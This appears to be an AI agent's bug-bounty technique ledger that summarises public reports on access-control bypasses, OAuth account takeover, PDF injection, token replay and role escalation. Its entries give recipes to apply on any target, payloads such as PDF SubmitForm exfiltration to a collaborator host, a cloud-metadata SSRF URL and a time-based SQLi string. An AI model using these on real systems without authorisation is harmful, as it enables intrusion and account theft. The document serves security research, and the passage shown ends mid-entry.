New general method -> §17.417.

SOURCE: https://hackerone.com/reports/4029867  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full report body read (the canonical vs wrapper routes, the permission_callback, the PoC steps; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no WordPress/Meta instance was stood up this pass; every quote below is verbatim from the report).
CLASS: broken access control / password-gate bypass — a custom REST wrapper route registers `permission_callback => '__return_true'` and only checks that the post is published and the occurrence exists, while the canonical endpoint enforces `Event::can_read_rsvps()` / `post_password_required()`; unauthenticated callers read the RSVP roster of password-protected events (CWE-862 / CWE-284).
CORE METHOD:
  1. THE CANONICAL ROUTE, verbatim: "GatherPress core (since 0.35.1) intentionally gates RSVP roster reads with `Event::can_read_rsvps()`, which requires that a published event's password gate is satisfied (`! post_password_required( $post )`). The core route: `GET /wp-json/gatherpress/v1/event/rsvp-responses?post_id={id}` uses `permission_callback => can_read_event_rsvps` and correctly returns 401 for password-protected events when the caller has not entered the password."
  2. THE WRAPPER ROUTE, verbatim: "The Meta wrapper route: `GET /wp-json/gpre/v1/event/{recurrence_id}/rsvp-responses?post_id={id}` registers `permission_callback => '__return_true'` and only checks that the post is publish and the occurrence exists. It never calls `Event::can_read_rsvps()` / `post_password_required()`."
  3. THE RESULT, verbatim: "an unauthenticated caller who does not know the event password can still retrieve the occurrence-scoped RSVP roster (attendee names, user IDs, profile URLs, comment IDs, timestamps) via gpre, while the official GatherPress endpoint denies the same request."
  4. THE SCOPE NOTE, verbatim: "This is not intentional public roster behavior for open events (that is by design). It is a password-gate bypass relative to GatherPress's documented/security model."
DETECTION SIGNAL: a product with TWO routes for the same resource — a canonical/core route and a wrapper/proxy/alias route (different prefix, recurring-event wrapper, mobile BFF, legacy alias); a wrapper whose `permission_callback` is `__return_true`, a missing callback, or a check that only verifies existence/publication. TELL: the wrapper returns 200 with the protected roster while the canonical route returns 401.
CHAIN: any unauthenticated attacker (primitive: can call the wrapper route) -> find the wrapper route (prefix `gpre/v1`, recurrence id) and call it with a password-protected event's `post_id` (primitive: the wrapper's `permission_callback` returns true) -> the wrapper never consults `post_password_required()` (escalation: the password gate is bypassed) -> the RSVP roster (names, user IDs, profile URLs, comments) is disclosed (impact: broken access control / password-gate bypass; HackerOne WordPress report #4029867, Medium). Per doctrine §8: preconditions = the target exposes both a canonical and a wrapper REST route for the same resource, and the event is password-protected; gain = the attendee roster of the password-protected event.
TRANSFERABLE TEST: on any API with a canonical route and a wrapper/alias/BFF route for the same resource — (1) enumerate both route families (prefixes like `/wp-json/<plugin>/v1/...` vs `/wp-json/<wrapper>/v1/...`, `/api/...` vs `/bff/...`, `/rest/...` vs `/ajax/...`); (2) call the wrapper with a protected object id (password-protected, private, unpublished) and compare the status/body with the canonical route; (3) a 200 on the wrapper where the canonical route 401s = the finding; (4) inspect the wrapper's `permission_callback` (often `__return_true`) and check whether it calls the same gate as the canonical route. Rule: **a wrapper route is a second authorization implementation — diff its permission_callback against the canonical route's, and a wrapper that returns true while the core enforces a gate is a BAC.**
DEDUPE: 0 hits across all three write targets for `gpre`, `rsvp-responses`, `permission_callback`, `wrapper route`, `__return_true`. The recorded WordPress material covers REST batch desync, plugin AJAX and user enumeration; none records a wrapper route with `permission_callback => '__return_true'` bypassing the canonical route's password gate. New general method -> §17.418.

SOURCE: https://hackerone.com/reports/3942522  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full report body read (the intended model, the mu-plugin defect, the exploit and the official docs; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no WordPress instance was stood up this pass; every quote below is verbatim from the report).
CLASS: privilege escalation (vertical) — an invite path persists the `role` from `$_REQUEST` without checking `get_editable_roles()`, and the acceptance path applies the stored role via `set_role()` with no `wp_ensure_editable_role()` re-check, so an Editor can grant Administrator despite `editable_roles` removing it (CWE-269 / CWE-863 / CWE-284).
CORE METHOD:
  1. THE INTENDED MODEL, verbatim: "On Rosetta locale sites (e.g. `xx.wordpress.org/team/`), Editors are intentionally allowed to invite existing network users (`promote_users`) but are blocked from assigning the Administrator role via the official WordPress `editable_roles` filter (`unset( $roles['administrator'] )` for non–super-admins)."
  2. THE DEFECT, verbatim: "The wordpress.org mu-plugin `wporg-add-existing-users-via-username.php` breaks that boundary: on `admin_action_adduser` it persists the invite option with `role` taken directly from `$_REQUEST['role']` before consulting `get_editable_roles()`."
  3. THE ACCEPTANCE, verbatim: "Core's `/newbloguser/{key}/` path then applies the stored role via `add_existing_user_to_blog()` → `set_role()` with no `wp_ensure_editable_role()` re-check."
  4. THE EXPLOIT, verbatim: "An Editor can therefore POST `role=administrator` (not offered in the UI dropdown), create a valid invite, and elevate an account to site Administrator (`manage_options` on that blog)."
  5. THE OFFICIAL DOCS, verbatim: "`get_editable_roles()` ... Specifically because without filtering anyone with the edit_users capability can edit others to be administrators, even if they are only editors or authors." and "`wp_ensure_editable_role()` (since 6.8.0) — stop execution if the role cannot be assigned by the current user (`403`)."
DETECTION SIGNAL: an invite/create-member endpoint that accepts a `role` parameter; a role allowlist enforced in the UI/`editable_roles` but not re-checked at persistence or acceptance; a two-step flow (invite stores role -> acceptance applies role). TELL: POST `role=administrator` (or any role outside the allowlist) to the invite endpoint, then accept the invite; if the account gains that role, the boundary is broken.
CHAIN: any authenticated Editor (primitive: allowed to invite) -> POST `role=administrator` to `admin_action_adduser` (primitive: role taken from `$_REQUEST`, not checked against `editable_roles`) -> invite stored with the admin role -> invitee accepts via `/newbloguser/{key}/` (escalation: stored role applied by `set_role()` with no re-check) -> site Administrator (`manage_options`) (impact: vertical privilege escalation; HackerOne WordPress report #3942522, High). Per doctrine §8: preconditions = the attacker holds an Editor (or any role allowed to invite) account on a locale site; gain = site Administrator on the target blog.
TRANSFERABLE TEST: on any invite/member-add flow with a role parameter — (1) capture the invite request and add/replace `role` with the highest role (`administrator`, `owner`, `superadmin`, a role the UI does not offer); (2) submit the invite; (3) accept it (or have a second account accept) and check the granted role; (4) also test a pending invite whose inviter is later removed/downgraded — if the role still applies, the invite is orphaned; (5) compare the accepted role against the `editable_roles`/allowlist the UI enforces. Rule: **a role persisted at invite time must be re-validated at acceptance — POST the highest role to the invite endpoint and check whether the allowlist is enforced server-side.**
DEDUPE: 0 hits across all three write targets for `editable_roles`, `set_role`, `wp_ensure_editable_role`, `Rosetta`, `invite role`, `admin_action_adduser`. The recorded invite material covers orphaned invites and BOLA invite-acceptance; none records an unvalidated role persisted from `$_REQUEST` and applied at acceptance despite `editable_roles`. New general method -> §17.419.

SOURCE: https://matitanium.medium.com/account-takeover-with-oauth-misconfiguration-d6b384649930  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the Login Methods discovery, the no-state behaviour, the callback-replay chain and the fix recommendations; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no OAuth flow was exercised this pass; every quote below is verbatim from the article).
CLASS: authentication bypass / account takeover — an OAuth account-linking flow with no `state` parameter and a persistent linking cookie lets an attacker complete THEIR OWN OAuth flow and send the callback URL to a victim; the victim's app links the attacker's provider account to the victim's profile, giving the attacker a login method (CWE-346 / CWE-384 / CWE-284).
CORE METHOD:
  1. THE SURFACE, verbatim: "I started by digging into the login mechanics ... Eventually, I discovered a section inside the account settings called **Login Methods**, where users could link external accounts via **OAuth**. The supported providers were: Apple, Google, Microsoft, Facebook."
  2. THE LINKING COOKIE, verbatim: "When you click **Add Facebook Account**, the application silently sets a random session cookie in the browser. This cookie is **essential** for the OAuth flow to work. Without it, the app rejects any response from Facebook. But **with** it? Even if the user never completes the flow the app will still process a valid OAuth code, as long as that cookie is present."
  3. THE MISSING BINDING, verbatim: "There was **no state parameter** used in the OAuth flow. **No CSRF protection. No binding between the request and the user.**"
  4. THE CHAIN, verbatim: "1. User clicks **Add Facebook Account** → app sets a **cookie** / 2. User closes the tab (doesn't finish flow) cookie still stays / 3. Attacker links **their** Facebook account to **their** own profile / 4. Attacker intercepts the final callback URL: `https://[REDACTED]/Facebook/AccessResponse?code=...` / 5. Attacker sends this link to the victim (e.g., phishing, redirect) / 6. Victim clicks → the app completes the flow using attacker's code / 7. Attacker's Facebook gets linked to the victim's account / 8. Now attacker can log in via Facebook and they're in."
  5. THE FIX, verbatim: "Implement the *state* parameter in **all** OAuth flows / Reject any callback that lacks proper session binding / Validate origin and integrity of each OAuth request / Optionally: tie Facebook codes to a user session using server-side state."
DETECTION SIGNAL: an OAuth/account-linking flow with no `state` parameter; a linking session cookie that persists after the flow is abandoned; a callback URL that can be replayed by a different browser/session; the app processes a valid OAuth code whenever the cookie is present, regardless of who started the flow. TELL: the victim's click on the attacker's callback URL links the attacker's provider account to the victim's profile.
CHAIN: any unauthenticated attacker (primitive: can start an OAuth flow on their own account) -> the app sets a linking cookie and has no state/CSRF binding (primitive: the flow is not tied to the user or the request) -> the attacker captures their own callback URL (`/Facebook/AccessResponse?code=...`) and sends it to the victim (escalation: the victim's session completes the attacker's flow) -> the attacker's Facebook is linked to the victim's account (impact: account takeover — the attacker can log in via Facebook; the article's report was accepted). Per doctrine §8: preconditions = the victim has the linking cookie set (they clicked "Add Facebook Account" and abandoned the flow) and clicks the attacker's callback URL; gain = the attacker's provider account becomes a login method for the victim's account.
TRANSFERABLE TEST: on any OAuth/account-linking flow — (1) click "link/connect <provider>" and capture the linking cookie and the callback URL; (2) complete the flow on YOUR account and save the final callback URL (`/.../AccessResponse?code=...` or `/oauth/callback?code=...`); (3) send that URL to a victim (or open it in a fresh browser where the linking cookie is set); (4) if the victim's account now shows the attacker's provider as a login method, the flow is CSRF-able; (5) also test the reverse: start the flow, abandon it, and replay an old callback URL to see whether the app still processes it. Rule: **an OAuth linking flow with no state is a CSRF — capture your own callback URL and replay it against a victim's linking session to bind your provider account to their profile.**
DEDUPE: 0 hits across all three write targets for `AccessResponse`, `Add Facebook Account`, `linking cookie`, `no-state callback replay`, `callback URL` + `victim`. Related-but-distinct: §17.285 records BOLA on a linking endpoint (the attacker chooses the victim's account id); this entry records the no-state CSRF variant where the victim's session completes the attacker's callback. The checklist line "CSRF on state, account linking hijack" (Bugbountyskills.md:15755) is prose, not an entry. New general method -> §17.420.

SOURCE: https://portswigger.net/research/portable-data-exfiltration  2026-11-10
ROUTE: `web_extract` on the live PortSwigger research page -> HTTP 200, full body read (the methodology, the PDF-Lib/jsPDF annotation injection, the Acrobat/PDFium exploits, the SubmitForm exfiltration and the SSRF; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no PDF library or reader was run this pass; every quote below is verbatim from the paper).
CLASS: XSS / code injection in PDF generation — a PDF library that does not escape parentheses/backslashes in annotation URIs or text streams lets an attacker break out of the string and inject PDF objects/actions, executing JavaScript in Acrobat/PDFium and exfiltrating the PDF's contents via `submitForm` (CWE-94 / CWE-79 / CWE-918 / CWE-200).
CORE METHOD:
  1. IDENTIFY, verbatim: "First of all, you need to identify whether the PDF generation library is escaping parentheses or backslashes. You can also try to generate these characters by using multi-byte characters that contain 0x5c (backslash) or 0x29 (parenthesis) in the hope the library incorrectly converts them to single-byte characters." — "PDF-Lib and jsPDF ... correctly escape text streams but makes the mistake of allowing PDF injection inside annotations."
  2. CONSTRUCT, verbatim: "Once you've established that you can influence the structure of the PDF, you need to construct an injection that confirms you control part of it. This can be done by calling `app.alert(1)` in PDF JavaScript or by using the submitForm action/function to make a POST request to an external URL." — the PDF-Lib annotation example: `A: { Type: 'Action', S: 'URI', URI: PDFString.of(`injection)`) }` — "The PDF would render correctly unless I injected a closing parenthesis. This proved that the closing parenthesis was breaking out of the string."
  3. EXPLOIT (ACROBAT, JS), verbatim: `/A<</S/JavaScript/JS(app.alert(1); this.submitForm({ cURL: 'https://your-id.burpcollaborator.net', cSubmitAs: 'PDF'}))` — "In Acrobat, I discovered that you can use JavaScript to submit forms without any user interaction!"
  4. EXPLOIT (ACROBAT, NO JS), verbatim: "Set flags to 256 to post contents of PDF" — `/A <</S/SubmitForm/Flags 256/F(https://your-id.burpcollaborator.net)>>`.
  5. EXPLOIT (CHROME/PDFIUM), verbatim: use `getPageNthWord`/`getPageNumWords` in an annotation `/JavaScript` action to enumerate the PDF's words, then `submitForm` to send them; "requires a click".
  6. SSRF, verbatim: "It's possible to send a POST request with PDFium/Acrobat to perform a SSRF attack. This would be a blind SSRF since you can make a POST request but can't read the response." — the paper also reads same-domain files "even when the Acrobat user agent is blocked by a WAF".
DETECTION SIGNAL: a server-side PDF generator (invoices, receipts, e-tickets, boarding passes, pay slips) that takes user input into a text stream or annotation; a library that does not escape parentheses/backslashes (PDF-Lib, jsPDF); an annotation URI or text stream that reflects your input. TELL: injecting `)` breaks the PDF or causes a parse error; an `/Action` dictionary with `/S/JavaScript` or `/S/SubmitForm` executes or makes an outbound request.
CHAIN: any authenticated user who can inject into a PDF field/link (primitive: user input reaches a PDF text stream or annotation URI) -> the library does not escape `)`/`\` (primitive: string breakout) -> the attacker injects an `/Action` dictionary with `/S/JavaScript` or `/S/SubmitForm` (escalation: PDF code execution) -> `submitForm`/`getPageNthWord` exfiltrates the PDF contents to an attacker server, or the SubmitForm POST is a blind SSRF (impact: XSS/content exfiltration/SSRF; PortSwigger research, Black Hat Europe 2020). Per doctrine §8: preconditions = the attacker can submit user-controlled text/URL that lands in a generated PDF and the victim opens it in Acrobat/Chrome; gain = the PDF's full contents exfiltrated to the attacker, or a blind SSRF from the reader/renderer.
TRANSFERABLE TEST: on any PDF-generating endpoint — (1) put `)` and `\` into every user-controlled field that lands in the PDF (names, addresses, invoice lines, annotation URLs); (2) a parse error/render break proves the breakout; (3) inject an annotation `/Action` dictionary with `/S/JavaScript/JS(app.alert(1))` and `/S/SubmitForm/Flags 256/F(https://<your-collaborator>)`; (4) open the PDF in Acrobat and Chrome; (5) an outbound request or alert = the finding; (6) aim the SubmitForm URL at `http://169.254.169.254/latest/meta-data/` for SSRF. Rule: **a PDF library that does not escape parentheses in annotation URIs is an XSS sink — break out of the string, inject an `/Action` dictionary, and exfiltrate the PDF with `submitForm`.**
DEDUPE: 0 hits across all three write targets for `PDFString`, `createAnnotation`, `SubmitForm`, `getPageNthWord`, `Flags 256`, `escape parentheses`, `PDF code injection`. Related-but-distinct: §17.256 records a PDF parser differential (form-field default vs widget annotation); the PDF SSRF entries record HTML/iframe injection into a renderer; this entry records PDF object/code injection via unescaped parentheses in annotation URIs. New general method -> §17.421.

NOTE — §17 additions 2026-11-10 batch 133 (§17.416–§17.421 appended from the 7 assigned sources read newest-first; 6 entries appended to the harvest ledger + 6 §17 slots). NEW: (1) bxmbn — a blank 200 `MailOid` endpoint MINTS the order's `WC_AUTHENTICATION_`/`WC_PERSISTENT` cookies and the `mailId` parameter is a universal key, so replaying the cookies on `OrderView?orderId=<any>` reads any order (3M users' PII, $15k) -> §17.416. (2) HackerOne WordPress #4152553 — `acf_get_posts()` queries `post_status='any'` with no `read_post` check, so ACF reference fields resolve private/draft/password-protected posts (with plaintext `post_password`) for unauthenticated callers -> §17.417. (3) HackerOne WordPress #4029867 — a wrapper REST route registers `permission_callback => '__return_true'` and never calls `post_password_required()`, exposing the RSVP roster of password-protected events while the canonical GatherPress route 401s -> §17.418. (4) HackerOne WordPress #3942522 — the Rosetta invite mu-plugin persists `role` from `$_REQUEST` before checking `editable_roles`, and acceptance applies it via `set_role()` with no `wp_ensure_editable_role()` re-check, so an Editor grants Administrator -> §17.419. (5) matitanium — an OAuth account-linking flow with no `state` and a persistent linking cookie lets the attacker replay their own callback URL to a victim, binding the attacker's Facebook to the victim's account -> ATO -> §17.420. (6) PortSwigger / Gareth Heyes — a PDF library that does not escape parentheses in annotation URIs is an XSS sink: break out of the string, inject an `/Action` dictionary with `/S/JavaScript` or `/S/SubmitForm/Flags 256`, and exfiltrate the PDF's contents or make a blind SSRF -> §17.421. VALID-BUT-DUPLICATE (read, nothing new, no entry): t4nv1 / Slack HTTP desync — CL.TE request smuggling with an obfuscated TE header and the Detect-Confirm-Explore methodology is already recorded (§11.5, the CL.TE/TE.0 entries and the PayPal cache-poisoning chain). INVALID FOR TECHNIQUE (real and readable, but no concrete method / below the bar, no entry): m3m0o / CVE-2025-8220 — SQLi in a non-standard `LanguageCombobox` cookie is a generic cookie-carrier SQLi with no new bypass or chain; Alaa Abdulridha / "How I hacked Facebook: Part One" — the page is mostly screenshots and gives no request shape for the exposed password-change endpoint. 7 sources read, 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

SOURCE: https://rakesh-thodupunoori.medium.com/part-2-dive-into-zoom-applications-1b01091345c1  2026-11-10
ROUTE: `web_extract` on the live Medium page -> HTTP 200, full body read (the `/user/get` token fields, the crafted `zak` URL, the `/pagerduty/config` request/response and the stated outcomes; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no Zoom endpoint was called this pass; every quote below is verbatim from the article). FRESHNESS: published 2019 (part 2 of a 2019 Zoom series) — the named tokens/endpoints are long dead, but the METHOD (a per-user session token disclosed by an IDOR-able user-info API and replayed as a URL query parameter) is the transferable atom.
CLASS: authentication bypass / account takeover — a per-user long-lived session token (`zak`) is disclosed by a user-information API keyed on a user id, and that token is accepted as the session credential when carried in a URL query parameter, so possession of the token (no password, no cookies) logs the attacker in as the account owner. Sibling atom: an auth `signature` query parameter that is presence-gated (an emptied value still authorizes) combined with an unchecked `user_id` -> other users' third-party integration API keys.
CORE METHOD:
  1. THE DISCLOSURE, verbatim: "one API endpoint **/user/get** gives all the user information if we provide user-id" — the response carries "*token, zpk, and zak*".
  2. THE HYPOTHESIS, verbatim: "zak and zpk are JWT tokens! wait, zoom is not using JWT for authentication. I tried to decode zak using JWT.io" — the author did not need to understand the token format, only WHERE it is accepted.
  3. THE REPLAY, verbatim: "Crafted URL: `https://zoom.us/<reducted>?zak=<zak token>`" — "Guess what! I was able to login to the owner account directly".
  4. THE SCALE, verbatim: "Found multiple API endpoints which disclose zak tokens and reported, Got a good reward!"
  5. THE SIBLING ATOM (presence-gated auth parameter + IDOR), verbatim: `GET /pagerduty/config?signature=7HuiNVkFlvvqNxooZzLAevNuvyA&user_id=M4u<REDUCTED> HTTP/1.1` with "There are no cookies" — the response is `{"is_admin":true,"platform_token":"<REDUCTED>","service_id":"P9ZRCKP"}`; "the signature acts as an auth. If I can bypass this I can steal any zoom user pager duty API key ... I simply removed the value of a signature and then? ... I was able to access the pager duty API key. Now changing the user_id to others I was able to view the pager duty API key."
DETECTION SIGNAL: a user-information/profile API whose response carries a SESSION-BEARING token (`zak`, `zpk`, `token`, `session`, `auth`) keyed on a user id you supply; a login/magic URL that accepts a token as a QUERY PARAMETER (`?zak=`, `?token=`, `?auth=`) rather than a header/cookie; an auth `signature`/`sig`/`key` query parameter whose EMPTY value still returns the protected object; an object id (`user_id`, `userId`, `uid`) in the same request with no ownership check. TELL: replaying the disclosed token in the URL logs you in as the token's owner, and an emptied `signature` returns the same body.
CHAIN: any unauthenticated attacker (primitive: can call the user-info API with an arbitrary user id) -> the API returns that user's session token `zak` (primitive: token disclosure, no ownership check) -> the attacker crafts `https://<host>/<path>?zak=<token>` and is logged in as the owner (escalation: authentication bypass -> account takeover of any user whose id is known/enumerable) -> the same token is disclosed by multiple sibling endpoints, so the primitive scales (impact: mass ATO; the article reports a reward). Sibling chain: the attacker calls `/pagerduty/config` with NO cookies and an EMPTIED `signature` (primitive: the auth parameter is presence-gated, not value-checked) -> the request succeeds and returns the integration's `platform_token` (escalation: third-party credential disclosure) -> the attacker swaps `user_id` (primitive: no ownership check) -> any user's PagerDuty API key is returned (impact: cross-user integration-credential theft; reported and rewarded). Per doctrine §8: preconditions = knowledge of the victim's user id (enumerable) and reachability of the token-disclosing endpoint; gain = the victim's session (full account) or their third-party integration API keys.
TRANSFERABLE TEST: on ANY target — (1) find every user-information/profile endpoint (`/user/get`, `/api/users/<id>`, `/account`, `/profile`, `/me`) and read the response for a session-bearing token field (`token`, `zak`, `zpk`, `session`, `auth`, `key`); (2) replay that token as a QUERY PARAMETER on the login/magic URL (`/<path>?zak=<token>`, `?token=<token>`, `?auth=<token>`) and as a header/cookie, and check whether you are authenticated as the token's owner; (3) for every `signature`/`sig`/`key` query parameter, replay with the value EMPTIED (`?signature=&user_id=<victim>`) and with the value removed, and swap the accompanying object id (`user_id`, `userId`, `uid`) — a 200 with the protected body = the auth parameter is presence-gated and the id is not ownership-checked. Rule: **a session token disclosed by an IDOR-able user-info API is a bearer credential — replay it in the URL/header/cookie the app actually accepts, and test every `signature`-style auth parameter with its value emptied.**
DEDUPE: 0 hits across all three write targets for `zpk`, `pagerduty`, `/user/get`, `zoom.us`, `developer.zoom.us`, `wp-nonce`, `wp_nonce`, and `zak` AS A TOKEN (all 14 `zak` hits are the researcher Zakhar Fedotkin's name). Related-but-distinct recorded material REVIEWED and NOT re-recorded: the ledger's "find any REST/API endpoint that accepts the session token as a QUERY parameter rather than a header" (~line 2035) is about API authentication via a query token, not a token DISCLOSED per user id and replayed to ESTABLISH a session; the Rocket.Chat entry (~line 10670) is a password-RESET token disclosed by an API (a different token type and use); the CircleCI entry (~line 9920) is a committed API token used as a bearer; V-06 "Token omission, deletion and stripping" (playbook ~line 4156) is a CSRF-token presence gate, not an auth `signature` query parameter. New general method -> §17.422.

SOURCE: https://tomorrowisnew.com/posts/broken-access-control-bug-bypassing-403-s-by-finding-another-endpoint-that-do-the-same-thing/  2026-11-10
ROUTE: `web_extract` on the live URL -> HTTP 422 `target_wrong_page` (the domain now serves a parked "Do Not Sell or Share My Personal Information" stub); `https://r.jina.ai/<url>` -> "Error. Page cannot be displayed."; the route that worked was the WAYBACK copy `http://web.archive.org/web/20221006203754/https://tomorrowisnew.com/posts/broken-access-control-bug-bypassing-403-s-by-finding-another-endpoint-that-do-the-same-thing/` -> HTTP 200, full body read (the `moved` parameter, the two-permission setup and the outcome).
STATUS: UNVERIFIED (not reproduced — no target endpoint was called this pass; every quote below is verbatim from the Wayback copy).
CLASS: broken function-level authorization (BFLA) — a lower-privileged UPDATE endpoint honours an ACTION parameter (`moved`) whose permission is enforced only on a DIFFERENT endpoint, so a user holding only the "update" permission performs the "move in/move out" action that requires a separate permission (CWE-863 / CWE-285).
CORE METHOD:
  1. THE SETUP, verbatim: "editing residents and moving in/moving out are on different permissions" — the product deliberately splits two actions across two permissions.
  2. THE OBSERVATION, verbatim: "We can see in the response that there is an interesting parameter called moved in. I tried including it in the request and setting it to true hoping it would change the value of that parameter and it works"
  3. THE BYPASS, verbatim: "So now, we can move in/move out residents if we have update permission. Normally, that wouldnt be a bug, but in this program, editing residents and moving in/moving out are on different permissions. I tried it again but this time, i remove the move in/move out permission. And it still works. It still allows me to move in/move out residents if we have update permission."
  4. THE CONTROL, verbatim: "Normally, moving in/moving out users is done in a different endpoint, if we tried it out, it will not work, because we have no permission to move in/move out as expected."
DETECTION SIGNAL: an endpoint whose permission is checked PER ENDPOINT (update allowed, move denied) while an ACTION parameter belonging to the denied endpoint is still parsed and honoured; a request parameter whose NAME matches a privileged action (`moved`, `move_in`, `move_out`, `publish`, `approve`, `role`, `status`) and whose value is a boolean/enum; a sibling endpoint that correctly 403s the same action. TELL: the lower-privilege request succeeds WITH the extra parameter and fails WITHOUT it, while the dedicated endpoint still 403s.
CHAIN: any authenticated user holding only the lower permission ("update") (primitive: a legitimate low-privilege role) -> the attacker adds the higher-permission action's parameter (`moved=true`) to the lower-privilege endpoint's request (primitive: the endpoint honours a parameter it has no permission to act on) -> the privileged action executes (escalation: BFLA — the move in/move out action is performed without its permission) -> the dedicated endpoint still refuses the same action, proving the check is per-endpoint not per-action (impact: a low-privilege user performs an action the product controls separately; the article's report was accepted). Per doctrine §8: preconditions = an authenticated account holding the lower of two split permissions; gain = the higher permission's action (here, moving residents in/out).
TRANSFERABLE TEST: on ANY product that splits permissions across endpoints — (1) map the permission matrix from the docs/UI (which role may update vs. which may move/publish/approve/assign); (2) capture a legitimate lower-privilege update request; (3) enumerate the parameters of the HIGHER-privilege sibling endpoint (from its request, the JS bundle or the API schema) and add each one to the lower-privilege request with a truthy value (`moved=true`, `publish=1`, `role=admin`, `status=approved`); (4) a success/side-effect with the extra parameter, while the dedicated endpoint still 403s, is the BFLA. Rule: **authorization is per-endpoint, not per-action — enumerate the parameters of a higher-privilege sibling endpoint and add them to a lower-privilege request; if the action executes, the endpoint checks the endpoint's permission and forgets the parameter's.**
DEDUPE: 0 hits across all three write targets for `tomorrowisnew`, `moved`, `move in`, `move out`, `update permission`, and `another endpoint` AS A TECHNIQUE. Related-but-distinct recorded material REVIEWED and NOT re-recorded: V-07 (HPP/array parameter pollution splitting a check from an action — a DUPLICATE-parameter split-brain, not an added action parameter); V-04 (mass assignment — a privileged FIELD bound onto an object, not an ACTION parameter triggering a privileged operation); V-06 (BFLA by function-level route/verb — a different endpoint entirely, not a parameter transferred into an allowed endpoint); the recorded "re-test authorization on sibling endpoints with the same object id" lesson (a sibling-endpoint re-test, not a parameter transfer). New general method -> §17.423.

SOURCE: https://0x01alka.medium.com/google-vrp-privilege-escalation-on-https-dialogflow-cloud-google-com-599af6c4516d  2026-11-10
ROUTE: `web_extract` on the live Medium page -> HTTP 200, full body read (the repro steps, the IAM observation and the timeline; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no Google Cloud endpoint was called this pass; every quote below is verbatim from the article).
CLASS: vertical privilege escalation — a role DOWNGRADE is applied ADDITIVELY (the new role's permissions are merged into the old set instead of replacing it), so a user downgraded from a higher role to a lower one retains every permission of the higher role (CWE-269 / CWE-284).
CORE METHOD:
  1. THE SETUP, verbatim: "Go to https://dialogflow.cloud.google.com/#/editAgent/{project}/ settings -> Share -> invite another user with 'Developer' role."
  2. THE ACTION, verbatim: "Downgrade 'Developer' role to 'Reviewer' and apply changes."
  3. THE OBSERVATION, verbatim: "Observe that although the changes have been applied and the role is 'Reviewer' now, but the user can still perform all actions as 'Developer'."
  4. THE ROOT CAUSE, verbatim: "I went to https://console.cloud.google.com/iam-admin/ and saw that roles and assignments of invited users ... not changing properly. When access level are changed, the permissions do not change ('Developer' -> 'Reviewer'), but adding to each other ('Developer'+'Reviewer')."
  5. THE OUTCOME, verbatim: "Apr 6, 2021 reported / Apr 7, 2021 triaged / Apr 16, 2021 Nice catch! / Apr 22, 2021 Awarded $3133.70 / Jun 13, 2021 Fix".
DETECTION SIGNAL: a role-management flow with a DOWNGRADE path (Developer->Reviewer, Admin->Editor, Owner->Member); the IAM/assignment backend shows the new role ADDED to the old one rather than replacing it; a downgraded account still passing the higher role's action checks. TELL: after the downgrade the UI shows the lower role while the privileged actions still succeed, and the provider's own IAM console lists BOTH roles.
CHAIN: any user who can be invited to a project/agent with a higher role (primitive: a legitimately-granted Developer/Admin seat) -> the owner downgrades the user to a lower role (primitive: the downgrade is a MERGE, not a REPLACE — the old permissions are never revoked) -> the user retains every higher-role permission (escalation: vertical privilege escalation — the lower role's restrictions are decorative) -> the user continues to perform all Developer actions (impact: a revoked/downgraded collaborator keeps full access; Google VRP awarded $3,133.70). Per doctrine §8: preconditions = an account that was legitimately granted a higher role and is then downgraded (no attacker action needed beyond using the retained permissions); gain = the full permission set of the higher role after the downgrade.
TRANSFERABLE TEST: on ANY product with a role-downgrade flow — (1) create/invite a test account with the HIGHER role (Developer/Admin/Editor) and confirm it can perform the privileged action; (2) downgrade it to the LOWER role (Reviewer/Viewer/Member) through the UI; (3) re-test EVERY privileged action from the same session (and after re-login) — if any still succeeds, the downgrade is additive; (4) inspect the provider's own IAM/assignment console (or the API that lists a user's roles) for BOTH roles still present; (5) also test the reverse order (upgrade then downgrade) and a downgrade followed by a re-invite. Rule: **a role downgrade must REPLACE the permission set, not merge into it — downgrade a test account and re-run every higher-role action; if any still succeeds (or the IAM console lists both roles), the downgrade is additive and the lower role is decorative.**
DEDUPE: 0 hits across all three write targets for `dialogflow`, `0x01alka`, `additive`, `still perform`, `permissions do not change`, and a role MERGE. Related-but-distinct recorded material REVIEWED and NOT re-recorded: §17.209 (Showmax parental PIN — a secret returned/mutated by a directly addressable route, not a role merge); the GitLab pull-mirror #819821 entry (a REMOVED member retains write — a removal that does not revoke, not a downgrade that merges); #1547684 (unlinking a login provider does not revoke its sessions — a different object); the recorded template/import test (~ledger line 2667) uses a downgrade as a way to REMOVE your own access before a background job runs — the opposite direction. New general method -> §17.424.

NOTE — §17 additions 2026-11-10 batch 134 (§17.422–§17.424 appended from the 6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger + 3 §17 slots). NEW: (1) rakesh-thodupunoori / Zoom Part 2 — a per-user session token (`zak`) is disclosed by the IDOR-able `/user/get?user-id=` API and replayed as a URL query parameter (`https://zoom.us/<path>?zak=<token>`) -> direct login as the owner (ATO); sibling atom: the `/pagerduty/config?signature=…&user_id=…` auth `signature` is presence-gated (an emptied value still authorizes) and the `user_id` is not ownership-checked -> any user's PagerDuty API key -> §17.422. (2) tomorrowisnew — a lower-privilege UPDATE endpoint honours an ACTION parameter (`moved=true`) whose permission is enforced only on a DIFFERENT endpoint, so a user with only "update" moves residents in/out -> BFLA -> §17.423. (3) 0x01alka / Google VRP Dialogflow — a role DOWNGRADE is applied ADDITIVELY (Developer->Reviewer yields Developer+Reviewer), so the downgraded user keeps every higher-role permission -> vertical privesc, $3,133.70 -> §17.424. VALID-BUT-DUPLICATE (read, nothing new, no entry): sapt / "SQLI on a Bugcrowd Private Program" — the method is the already-recorded time-based SQLi triage (`(select * from (select(sleep(20)))a)`, the same payload family as the ledger's WordPress-search and numeric-position entries, with `--random-agent --level=5 --risk=3 --dbs --batch`); imranhudaa / "Accessing Restricted Documents With Extra JSON Body Content" — an extra object-reference field (`documentId`) in a create JSON body is a DELTA of the recorded mass-assignment / object-id-in-body 